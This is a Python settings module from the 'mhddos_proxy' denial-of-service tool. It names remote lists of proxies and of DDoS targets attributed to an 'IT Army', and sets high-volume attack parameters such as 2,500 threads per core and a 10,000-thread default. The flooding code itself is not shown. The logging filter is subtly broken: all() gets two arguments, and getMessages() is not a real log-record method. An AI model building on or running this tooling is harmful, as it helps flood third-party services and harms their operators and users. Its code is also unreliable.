from asyncio.log import logger as asyncio_logger
import logging
from pathlib import Path

from colorama import Fore


class RemoveUselessWarnings(logging.Filter):

    def filter(self, record):
        return all(
            "socket.send() raised exception." not in record.getMessage(),
            "SSL connection is closed" not in record.getMessages()
        )


logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = logging.getLogger('mhddos_proxy')
logger.setLevel('INFO')

# Make asyncio logger a little bit less noisy
asyncio_logger.addFilter(RemoveUselessWarnings())


ROOT_DIR = Path(__file__).parent.parent

PROXIES_URLS = (
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txt',
)
IT_ARMY_CONFIG_URL = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_tcp_v2.txt'
VERSION_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/mhddos_proxy/main/version.txt'

LOW_RPC = 1_000
THREADS_PER_CORE = 2_500
MAX_DEFAULT_THREADS = 10_000
CONFIG_FETCH_RETRIES = 3
CONFIG_FETCH_TIMEOUT = 10
REFRESH_OVERTIME = 2  # roughly 5 more seconds
REFRESH_RATE = 5
FAILURE_BUDGET_FACTOR = 6
FAILURE_DELAY_SECONDS = 1
ONLY_MY_IP = 100
SCHEDULER_INITIAL_CAPACITY=3
SCHEDULER_FORK_SCALE=2
SCHEDULER_FAILURE_DELAY=0.5
CONN_PROBE_PERIOD = 5


class cl:
    MAGENTA = Fore.LIGHTMAGENTA_EX
    BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.LIGHTGREEN_EX
    YELLOW = Fore.LIGHTYELLOW_EX
    RED = Fore.LIGHTRED_EX
    RESET = Fore.RESET

